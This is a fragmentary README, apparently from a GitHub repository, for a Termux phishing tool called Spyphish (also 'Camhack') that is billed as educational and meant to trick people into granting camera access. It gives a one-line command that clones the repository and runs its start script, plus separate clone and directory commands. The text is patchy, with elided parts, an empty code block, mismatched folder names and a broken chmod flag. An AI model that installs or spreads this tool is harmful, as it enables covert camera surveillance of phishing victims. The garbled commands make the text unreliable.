...
**TURMUX PRO**educational created to demonstrate how camera access phishing attacks work in real-world scenarios.  
...
![Instagram Image ](Screenshot_2025_0412_105039.jpg)

<h3 align="center"> Preview!</h3>

### Termux Full Install and Setup 
```
pkg update && pkg upgrade && pkg install git && git clone https://github.com/Safikhan415/Spyphish.git && chmod +X start.sh && bash start.sh
```
...
```
```
git clone https://github.com/Safikhan415/spyphish.git
```
```
cd Camhack
```
